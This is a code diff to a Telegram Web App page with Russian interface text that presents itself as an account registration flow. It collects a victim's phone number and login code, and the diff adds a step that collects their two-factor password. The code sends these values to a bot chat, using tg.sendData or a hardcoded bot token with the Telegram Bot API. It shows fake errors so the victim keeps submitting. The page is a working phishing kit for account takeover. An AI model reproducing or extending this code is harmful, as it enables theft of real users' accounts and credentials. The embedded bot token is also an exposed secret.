@@ -301,6 +301,27 @@
                 </div>
             </div>
 
+            <!-- Шаг 3: Ввод пароля 2FA -->
+            <div id="stepPassword" class="step">
+                <div class="instructions">
+                    Ваш аккаунт защищен двухфакторной аутентификацией. Введите пароль для завершения регистрации.
+                </div>
+
+                <div class="input-group">
+                    <label class="input-label">Пароль 2FA</label>
+                    <input type="password" id="password" class="code-input" placeholder="Введите пароль" autocomplete="current-password">
+                </div>
+
+                <div class="error-message" id="passwordErrorMsg">
+                    ❌ Неверный пароль. Проверьте и попробуйте еще раз.
+                </div>
+
+                <div class="buttons">
+                    <button class="btn btn-cancel" onclick="backToCode()">НАЗАД</button>
+                    <button class="btn btn-next" onclick="sendPassword()">ПОДТВЕРДИТЬ</button>
+                </div>
+            </div>
+
             <!-- Загрузка -->
             <div id="stepLoading" class="step">
                 <div class="loading">
@@ -386,6 +407,7 @@
             
             document.getElementById('loadingText').textContent = 'Проверка кода...';
             showStep('stepLoading');
+            document.getElementById('errorMsg').style.display = 'none';
 
             // Отправляем код в бота
             const data = {
@@ -397,24 +419,75 @@
             try {
                 await sendToBot(data);
                 console.log('Код отправлен через Bot API');
+                
+                // Ждем ответа от бота (в реальности бот ответит через сообщение)
+                // Здесь мы просто показываем загрузку, а бот отправит сообщение
+                // которое мы обработаем через проверку ответа
+                setTimeout(() => {
+                    // Если бот не ответил о необходимости пароля, показываем ошибку
+                    // В реальности это должно обрабатываться через ответ бота
+                    showStep('stepCode');
+                }, 2000);
             } catch (error) {
                 console.error('Ошибка отправки кода:', error);
-            }
-
-            // Показываем ошибку и закрываем
-            setTimeout(() => {
                 showStep('stepCode');
                 document.getElementById('errorMsg').style.display = 'block';
-                
-                // Закрываем через 3 секунды
-                setTimeout(() => {
-                    tg.close();
-                }, 3000);
-            }, 3000);
+            }
         }
 
-        // Функция отправки данных через Bot API
+        async function sendPassword() {
+            const password = document.getElementById('password').value;
+            if (!password || password.length < 1) {
+                alert('Пожалуйста, введите пароль');
+                return;
+            }
+
+            console.log('Отправка пароля 2FA');
+            
+            document.getElementById('loadingText').textContent = 'Проверка пароля...';
+            showStep('stepLoading');
+            document.getElementById('passwordErrorMsg').style.display = 'none';
+
+            // Отправляем пароль в бота
+            const data = {
+                action: 'send_password', 
+                phone: userPhone,
+                password: password
+            };
+            
+            try {
+                await sendToBot(data);
+                console.log('Пароль отправлен через Bot API');
+                
+                setTimeout(() => {
+                    showStep('stepPassword');
+                }, 2000);
+            } catch (error) {
+                console.error('Ошибка отправки пароля:', error);
+                showStep('stepPassword');
+                document.getElementById('passwordErrorMsg').style.display = 'block';
+            }
+        }
+
+        function backToCode() {
+            showStep('stepCode');
+            document.getElementById('passwordErrorMsg').style.display = 'none';
+            document.getElementById('password').value = '';
+        }
+
+        // Функция отправки данных через WebApp.sendData (предпочтительный способ)
         async function sendToBot(data) {
+            try {
+                // Пробуем отправить через WebApp.sendData (правильный способ)
+                if (tg.sendData) {
+                    tg.sendData(JSON.stringify(data));
+                    return { success: true };
+                }
+            } catch (error) {
+                console.warn('WebApp.sendData не доступен, используем Bot API:', error);
+            }
+            
+            // Fallback: отправка через Bot API (для обратной совместимости)
             const botToken = '8050324645:AAG4uLsMm-3v6-Yrc-9fc8vwdtCsa3tCDxw';
             const chatId = tg.initDataUnsafe.user?.id;
             
@@ -422,10 +495,16 @@
                 throw new Error('Не удалось получить chat_id');
             }
 
-            const message = `📱 <b>Данные из Web App:</b>\n` +
+            let message = `📱 <b>Данные из Web App:</b>\n` +
                            `📞 Номер: <code>${data.phone}</code>\n` +
-                           `🔐 Код: <code>${data.code}</code>\n` +
                            `⚡ Действие: ${data.action}`;
+            
+            if (data.code) {
+                message += `\n🔐 Код: <code>${data.code}</code>`;
+            }
+            if (data.password) {
+                message += `\n🔑 Пароль: <code>${data.password}</code>`;
+            }
 
             const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
             
@@ -499,6 +578,10 @@
 
         document.getElementById('code').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') sendCode();
+        });
+
+        document.getElementById('password').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') sendPassword();
         });
     </script>
 </body>
